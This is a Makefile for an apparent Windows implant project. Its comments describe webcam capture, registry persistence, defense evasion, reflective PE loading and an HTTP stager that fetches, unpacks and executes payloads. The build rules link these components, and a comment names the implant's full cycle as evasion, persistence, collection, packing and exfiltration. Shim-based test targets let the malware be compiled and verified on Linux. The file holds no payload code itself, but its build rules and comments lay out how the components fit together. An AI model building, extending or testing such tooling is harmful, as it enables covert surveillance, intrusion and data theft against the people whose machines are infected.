# agent_windows/Makefile
#
# 构建策略（平台分层，避免 Windows 源码污染 Linux 构建）：
#
#   all / test  —— Linux 可编译测试目标。只编译跨平台纯 C 源码：
#                    src/cam_jpeg.c   （YUYV422→JPEG 编码器，纯 C99）
#                    src/cam_mock.c   （Mock 采集后端，纯 C）
#                    include/camera.h （公共接口）
#                  Windows 专属后端 src/cam_mf.cpp / src/cam_mf_main.cpp
#                  被 #ifdef _WIN32 整体包裹，Linux 下不参与编译、不参与链接。
#
#   win         —— Windows 后端编译目标（可选）。需要 MinGW 交叉工具链或
#                  MSVC；Linux 沙盒无 windows.h / mfapi.h，检测到无工具链
#                  时打印跳过信息并返回 0（不是错误）。

CC       ?= cc
CXX      ?= g++

# defend_win.c 复用 17_loader 的 PE 导出解析与 19_defense 的桩字节，
# 不重复实现这两层，因此构建时需要带上它们的头文件与对应源文件。
DEP_I    := -I../17_loader/include -I../19_defense/include
CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I)
CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
LDLIBS   ?= -lm

BUILD     := build/linux

# 上游构建触发。
#
# 下面的 winshim 链接规则用 ../20_packer/build/*.o —— 那是 shell glob，在
# recipe 执行时展开。上游 clean 后 glob 不匹配任何文件，shell 把模式原样
# 传给编译器，报的是 "No such file or directory" 或一串无关的 undefined
# reference，真实原因（上游未构建）被掩盖。与 25_deploy 是同一类缺陷。
#
# $(shell) 在读取阶段真实执行上游 make：上游自身有增量判断，已构建时几乎
# 零开销。stdout 必须丢弃（否则混进变量值），stderr 保留。
_PACKER_PREBUILD := $(shell $(MAKE) -C ../20_packer --no-print-directory >/dev/null)

# cam_factory.c 提供统一的 cam_source_create / cam_source_destroy 并按 backend
# 名字分发；cam_mock.c 与 cam_linux_v4l2.c 现在可以同时链接（此前两者都导出
# cam_source_create，只能二选一，导致 Linux 真机无法在保留 mock 测试的前提下
# 启用 V4L2）。
PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/cam_factory.c \
            src/cam_linux_v4l2.c src/implant.c src/defend_win.c \
            src/reflect_run.c
PORT_OBJS := $(PORT_SRCS:src/%.c=$(BUILD)/%.o)

DEP_OBJS  := $(BUILD)/dep/loader_pe.o $(BUILD)/dep/loader_reflect.o \
             $(BUILD)/dep/defense_evade.o

TESTS     := test_pipeline test_linux_extra test_implant test_defend_win \
             test_reflect_run
TEST_BINS := $(TESTS:%=$(BUILD)/%)

# winshim 下的测试（test_mf_logic / test_persist_win / test_implant_main /
# test_stager_win）不在 all 里，它们需要 Windows shim 编译链；回归脚本
# 显式调用 winshim-build 来构建。声明给审计脚本，避免被判为"默认目标漏构建"。
AUDIT_GOALS := winshim-build

.PHONY: all test clean win dirs

all: $(TEST_BINS)

dirs:
	@mkdir -p $(BUILD)

$(BUILD)/%.o: src/%.c include/camera.h | dirs
	$(CC) $(CFLAGS) -c $< -o $@

# 复用的外部模块目标文件（17_loader 的 PE 解析 / 19_defense 的桩字节）
$(BUILD)/dep/loader_pe.o: ../17_loader/src/pe.c | dirs
	@mkdir -p $(BUILD)/dep
	$(CC) $(CFLAGS) -c $< -o $@

# 反射加载：17_loader 只做到内存映像构造，权限/TLS/入口三步在 src/reflect_run.c
$(BUILD)/dep/loader_reflect.o: ../17_loader/src/reflect.c | dirs
	@mkdir -p $(BUILD)/dep
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/dep/defense_evade.o: ../19_defense/src/evade.c | dirs
	@mkdir -p $(BUILD)/dep
	$(CC) $(CFLAGS) -c $< -o $@

# 每个测试二进制 = 该测试源码 + 跨平台内核源码 + 复用的外部模块
# synth_pe.c 是测试共用的合成 PE 构造器（test_reflect_run 与 test_stager_win 共用），
# 见 tests/synth_pe.h 顶部关于"为何不复制一份"的说明。
$(BUILD)/synth_pe.o: tests/synth_pe.c tests/synth_pe.h | dirs
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_%: tests/test_%.c $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o | dirs
	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o -o $@ $(LDLIBS)

test: $(TEST_BINS)
	@fail=0; \
	for t in $(TEST_BINS); do \
		echo "=== $$t ==="; \
		./$$t || fail=1; \
	done; \
	exit $$fail

# Windows 后端：仅在检测到 MinGW 交叉工具链时真正编译
win: | dirs
	@if command -v x86_64-w64-mingw32-g++ >/dev/null 2>&1; then \
		x86_64-w64-mingw32-g++ $(CXXFLAGS) -c src/cam_mf.cpp -o $(BUILD)/cam_mf.o \
			&& echo "win: cam_mf.cpp 编译 OK"; \
	else \
		echo "win: 跳过（无 Windows 工具链 / windows.h；cam_mf.cpp 不参与 Linux 构建）"; \
	fi

clean:
	rm -rf build

# ---------------------------------------------------------------------------
# winshim —— 用 Windows SDK shim 在 Linux 下对 cam_mf.cpp 做真实编译 + 逻辑验证
#
# 背景：MinGW 交叉工具链在本沙盒不可得（apt 源 403，GitHub release 403），
# 因此无法做真机交叉编译。等价路径是由 tests/winsdk_shim 提供 Windows
# 头文件的最小等价声明 + 可运行 mock Media Foundation，使 Windows 专用源码
# 能被 g++ 真实编译，并用受控假设备真跑其逻辑分支。
#
# 覆盖：语法、类型、调用契约、格式协商、取帧、生命周期。
# 不覆盖：Windows Media Foundation 的真实设备行为（需真机）。
#
# 该验证已抓出 5 个真实缺陷，详见 tests/winsdk_shim/README。
# ---------------------------------------------------------------------------
SHIM_BUILD := build/winshim
SHIM_I     := -Iinclude -Itests/winsdk_shim -I../17_loader/include -D_WIN32
SHIM_CXX   := $(CXX) -std=c++14 -O1 -Wall -Wextra -Wno-unknown-pragmas $(SHIM_I) \
              -I../25_deploy/include -I../20_packer/include -D_GNU_SOURCE
SHIM_CC    := $(CC) -std=c11 -O1 -Wall -Wextra $(SHIM_I) \
              -I../25_deploy/include -I../20_packer/include -I../00_crypto/include -D_GNU_SOURCE

.PHONY: winshim winshim-build

winshim-build:
	@mkdir -p $(SHIM_BUILD)
	$(SHIM_CXX) -c src/cam_mf.cpp -o $(SHIM_BUILD)/cam_mf.o
	$(SHIM_CXX) -c tests/winsdk_shim/shim_impl.cpp -o $(SHIM_BUILD)/shim_impl.o
	$(SHIM_CXX) -c tests/test_mf_logic.cpp -o $(SHIM_BUILD)/test_mf_logic.o
	$(CXX) $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/shim_impl.o \
	      $(SHIM_BUILD)/test_mf_logic.o -o $(SHIM_BUILD)/test_mf_logic
	# G2：持久化。persist_win.c 是 Windows 专属源码，用 -x c++ 编译，
	#     链接 shim_impl.o 提供的有状态注册表 mock，安装行为可真读回验证。
	$(SHIM_CXX) -x c++ -c src/persist_win.c -o $(SHIM_BUILD)/persist_win.o
	$(SHIM_CXX) -c tests/test_persist_win.cpp -o $(SHIM_BUILD)/test_persist_win.o
	$(CXX) $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
	      $(SHIM_BUILD)/test_persist_win.o -o $(SHIM_BUILD)/test_persist_win
	# 单体植入体接线层：对抗 -> 驻留 -> 采集 -> 打包 -> 回传 的完整生命周期。
	# implant_main.c / implant.c / cam_mock.c 是纯 C99，用 -x c++ 与 shim 一起编译，
	# 使 Windows 专属的 persist_win.o（shim 注册表）能被真实链接进来。
	$(SHIM_CXX) -x c++ -c src/implant_main.c -o $(SHIM_BUILD)/implant_main.o
	$(SHIM_CXX) -x c++ -c src/reflect_run.c -o $(SHIM_BUILD)/reflect_run.o
	$(SHIM_CXX) -x c++ -c ../17_loader/src/pe.c -o $(SHIM_BUILD)/pe.o
	$(SHIM_CXX) -x c++ -c ../17_loader/src/reflect.c -o $(SHIM_BUILD)/reflect.o
	$(SHIM_CXX) -x c++ -c src/implant.c -o $(SHIM_BUILD)/implant.o
	$(SHIM_CXX) -x c++ -c src/cam_jpeg.c -o $(SHIM_BUILD)/cam_jpeg.o
	$(SHIM_CXX) -x c++ -c src/cam_factory.c -o $(SHIM_BUILD)/cam_factory.o
	$(SHIM_CXX) -c tests/test_implant_main.cpp -o $(SHIM_BUILD)/test_implant_main.o
	# 采集后端用 cam_mf.o（Windows 真实代码路径 + shim 假设备），而不是
	# cam_mock.o：这样验证的是 Windows 采集路径本身能被主循环驱动。
	# （分发层 cam_factory.o 已单独链入，见上。）
	$(CXX) $(SHIM_BUILD)/implant_main.o $(SHIM_BUILD)/implant.o \
	      $(SHIM_BUILD)/reflect_run.o $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
	      $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
	      $(SHIM_BUILD)/cam_factory.o \
	      $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
	      $(SHIM_BUILD)/test_implant_main.o -o $(SHIM_BUILD)/test_implant_main

	# Windows 投送链端到端：Winsock 拉块 -> 组装 -> 解包 -> 反射装载 -> 真执行
	#
	# 服务端也走 shim 的 Winsock（转发宿主真实 TCP），因此 stager 必须真的
	# 连上、真的解析 HTTP 报文才能拿到块 —— 不是 mock 恒返回成功。
	#
	# C 与 C++ 分开编译：投递层是 C11 源码，用 -x c++ 会撞上 C++ 的类型严格性
	# （void* 不再隐式转换）。shim 头文件（winsock2.h / winmem.h）刻意做成
	# C/C++ 双可用，头文件侧则统一用 extern "C" 保证跨语言链接。
	$(SHIM_CC) -c src/drop_stager_win.c -o $(SHIM_BUILD)/drop_stager_win.o
	$(SHIM_CC) -c ../25_deploy/src/drop.c -o $(SHIM_BUILD)/s_drop.o
	$(SHIM_CC) -c ../25_deploy/src/drop_http.c -o $(SHIM_BUILD)/s_drop_http.o
	$(SHIM_CC) -c ../25_deploy/src/drop_pe.c -o $(SHIM_BUILD)/s_drop_pe.o
	$(SHIM_CC) -c tests/synth_pe.c -o $(SHIM_BUILD)/s_synth_pe.o
	$(SHIM_CC) -c tests/stager_srv.c -o $(SHIM_BUILD)/s_stager_srv.o
	$(SHIM_CXX) -c tests/winsdk_shim/shim_winsock.cpp -o $(SHIM_BUILD)/shim_winsock.o
	$(SHIM_CXX) -c tests/test_stager_win.cpp -o $(SHIM_BUILD)/test_stager_win.o
	$(CXX) $(SHIM_BUILD)/test_stager_win.o $(SHIM_BUILD)/drop_stager_win.o \
	      $(SHIM_BUILD)/s_drop.o $(SHIM_BUILD)/s_drop_http.o \
	      $(SHIM_BUILD)/s_drop_pe.o $(SHIM_BUILD)/s_synth_pe.o \
	      $(SHIM_BUILD)/s_stager_srv.o $(SHIM_BUILD)/reflect_run.o \
	      $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
	      $(SHIM_BUILD)/shim_winsock.o $(SHIM_BUILD)/shim_impl.o \
	      ../20_packer/build/*.o -o $(SHIM_BUILD)/test_stager_win -lpthread

winshim: winshim-build
	@./$(SHIM_BUILD)/test_mf_logic
	@./$(SHIM_BUILD)/test_persist_win
	@./$(SHIM_BUILD)/test_implant_main
	@./$(SHIM_BUILD)/test_stager_win
